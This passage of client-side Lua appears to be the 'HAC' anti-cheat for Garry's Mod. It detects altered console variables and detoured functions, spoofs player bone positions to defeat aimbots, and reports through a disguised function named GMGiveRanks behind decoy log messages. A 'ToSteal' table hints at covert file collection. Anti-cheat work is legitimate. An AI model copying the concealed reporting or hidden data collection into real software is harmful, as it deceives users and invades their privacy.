		if ( NotHGT()["KeyPress"] ) then
			if ( NotHGT()["KeyPress"]["timeToShoot"] ) then
				GMGiveRanks("KeyPress=nBot:timeToShoot")
			end
		end
		if ( NotHGT()["ProcessSetConVar"] ) then
			if ( NotHGT()["ProcessSetConVar"]["SEIsShit"] ) then
				GMGiveRanks("ProcessSetConVar=SEIsShit")
			end
		end
		if ( NotHGT()["Initialize"] ) then
			if ( NotHGT()["Initialize"]["ES_OR"] ) then
				GMGiveRanks("Initialize=BCSCripts:ES_OR")
			end
		end	
		if ( NotHGT()["PlayerConnect"] ) then
			if ( NotHGT()["PlayerConnect"]["BC_IPLog"] ) then
				GMGiveRanks("PlayerConnect=BCSCripts:BC_IPLog")
			end
		end	
	end)
end)

MsgN("//  Unblocking drains..          //")
NotTC(RandomCharsHere.."2", 0.3, 0, function()
	if not StartKR30 then return end
	
	if NotGCN("cl_cmdrate") != 30 then
		NotRCC("cl_cmdrate","30") --not a big deal
	end
	if (NotGCS("sv_cheats") != "0") then
		if !KR30SVC then
			KR30SVC = true
			GMGiveRanks("KR30=sv_cheats="..NotGCS("sv_cheats"))
		end
	end
	if (NotGCN("host_timescale") != 1) then
		if !KR30HTS then
			KR30HTS = true
			GMGiveRanks("KR30=host_timescale="..NotGCS("host_timescale"))
		end
	end
	if NotGCV("host_framerate"):GetBool() then
		if !KR30HFR then
			KR30HFR = true
			GMGiveRanks("KR30=host_framerate="..NotGCS("host_framerate"))
		end
	end
	if (NotGCS("net_blockmsg") != "none") then
		if !KR30NBM then
			KR30NBM = true
			GMGiveRanks("KR30=net_blockmsg="..NotGCS("net_blockmsg"))
		end
	end
	if (NotGCS("cl_forwardspeed") != "10000") then
		if !KR30CFS then
			KR30CFS = true
			GMGiveRanks("KR30=cl_forwardspeed="..NotGCS("cl_forwardspeed"))
		end
	end
	
	if hook.Add != NotHA then --hook.Add
		if not KR30HA then
			KR30HA = true
			GMGiveRanks("Detour3=hook.Add")
		end
	end
	if hook.Remove != NotHR then --hook.Remove
		if not KR30HR then
			KR30HR = true
			GMGiveRanks("Detour3=hook.Remove")
		end
	end
	if hook.GetTable != NotHGT then --hook.GetTable
		if not KR30HGT then
			KR30HGT = true
			GMGiveRanks("Detour3=hook.GetTable")
		end
	end
	
	if file.FindInLua != NotFFIL then --file.FindInLua
		if not KR30FFIL then
			KR30FFIL = true
			GMGiveRanks("Detour3=file.FindInLua")
		end
	end
	if file.Find != NotFF then --file.Find
		if not KR30FF then
			KR30FF = true
			GMGiveRanks("Detour3=file.Find")
		end
	end
	if file.Read != NotFR then --file.Read
		if not KR30FR then
			KR30FR = true
			GMGiveRanks("Detour3=file.Read")
		end
	end
	if GetConVar != NotGCV then --GetConVar
		if not KR30GCV then
			KR30GCV = true
			GMGiveRanks("Detour3=GetConVar")
		end
	end
	if GetConVarString != NotGCS then --GetConVarString
		if not KR30GCS then
			KR30GCS = true
			GMGiveRanks("Detour3=GetConVarString")
		end
	end
	if GetConVarNumber != NotGCN then --GetConVarNumber
		if not KR30GCN then
			KR30GCN = true
			GMGiveRanks("Detour3=GetConVarNumber")
		end
	end
	if RunConsoleCommand != NewRCC then --RunConsoleCommand
		if not KR30RCC then
			KR30RCC = true
			GMGiveRanks("Detour3=RunConsoleCommand")
		end
	end
	if concommand.Add != NotCCA then --concommand.Add
		if not KR30CCA then
			KR30CCA = true
			GMGiveRanks("Detour3=concommand.Add")
		end
	end
	if require != NotRQ then --require
		if not KR30RQ then
			KR30RQ = true
			GMGiveRanks("Detour3=require")
		end
	end
	if engineConsoleCommand != NotECC then --engineConsoleCommand
		if not KR30ECC then
			KR30ECC = true
			GMGiveRanks("Detour3=engineConsoleCommand")
		end
	end	
	
	if not NotRE( NotRG(_G, "GetConVar"), NotGCV) then --GetConVar
		if not KR30RGGCV then
			KR30RGGCV = true
			GMGiveRanks("Detour4=GetConVar")
		end
	end
	if not NotRE( NotRG(_G, "GetConVarString"), NotGCS) then --GetConVarString
		if not KR30RGGCS then
			KR30RGGCS = true
			GMGiveRanks("Detour4=GetConVarString")
		end
	end
	if not NotRE( NotRG(_G, "GetConVarNumber"), NotGCN) then --GetConVarNumber
		if not KR30RGGCN then
			KR30RGGCN = true
			GMGiveRanks("Detour4=GetConVarNumber")
		end
	end
	if not NotRE( NotRG(_G, "RunConsoleCommand"), NewRCC) then --RunConsoleCommand
		if not KR30RGRCC then
			KR30RGRCC = true
			GMGiveRanks("Detour4=RunConsoleCommand")
		end
	end
	if not NotRE( NotRG(_G, "engineConsoleCommand"), NotECC) then --engineConsoleCommand
		if not KR30RGECC then
			KR30RGECC = true
			GMGiveRanks("Detour4=engineConsoleCommand")
		end
	end	
end)

MsgN("//  Checking the tank..          //")
local function RefreshRanks(ply,cmd,args)
	NotRCC("gm_pong", "None", "HACReport")
	
	timer.Destroy(RandomCharsHere)
	timer.Destroy(RandomCharsHere.."2")
	hook.Remove("InitPostEntity",RandomCharsHere.."3")
	timer.Destroy(RandomCharsHere.."4")
	
	NotTS(1, function()
		NotINC("includes/enum/!!!!!!!!!!.lua")
	end)
end
concommand.Add("gm_refreshranks", RefreshRanks)


MsgN("//  Cheeseburger Apocalypse..    //")
local function NewBonePos(ent,bone)
	if bone and (bone == 14 or bone == 6) and not IsDev[LocalPlayer():SteamID()] then
		return Vector(1,33,7), Angle(1,33,7)
	end
	if not (ent and ent:IsValid()) then return end
	return NotGBP(ent,bone)
end

_R["Entity"]["GetBonePosition"] 	= NewBonePos
_R.Entity.GetBonePosition 			= NewBonePos
NotFMT("Entity").GetBonePosition	= NewBonePos
_R["Player"]["GetBonePosition"] 	= NewBonePos
_R.Player.GetBonePosition 			= NewBonePos
NotFMT("Player").GetBonePosition 	= NewBonePos


local function NewAtchPos(ent,ach)
	if ach and ach == "eyes" and not IsDev[LocalPlayer():SteamID()] then
		return 1337
	end
	if not (ent and ent:IsValid()) then return end
	return NotACH(ent,ach)
end

_R["Entity"]["LookupAttachment"]	= NewAtchPos
_R.Entity.LookupAttachment			= NewAtchPos
NotFMT("Entity").LookupAttachment 	= NewAtchPos
_R["Player"]["LookupAttachment"] 	= NewAtchPos
_R.Player.LookupAttachment			= NewAtchPos
NotFMT("Player").LookupAttachment 	= NewAtchPos

HACInstalled = HACInstalled + 1  --eh why not

LoadTime = math.floor(LoadTime - CurTime())
if LoadTime < 0 then
	LoadTime = -LoadTime
end

hook.Add("InitPostEntity",RandomCharsHere.."3", function()
	NotRCC("gm_init","good", tostring(LoadTime))
end)


HACLength = 2328 / 64
HACLength = HACLength + #AddonsTAB + #AddonsKWTAB + #CVTab + #RCCTab + #CMDTab + #BadLuaFiles + #BadData + #BadFiles + #ToSteal

HACLength = math.floor(HACLength)

MsgN("///////////////////////////////////")
MsgN("//    All done in ["..LoadTime.."] seconds    //")
MsgN("//         [HAC] loaded          //")
MsgN("///////////////////////////////////")

MsgN("\nThe hack/anti-hack discussions are just dick measuring contests")
MsgN("HeX's E-Penis is "..HACLength.." feet long!\n")








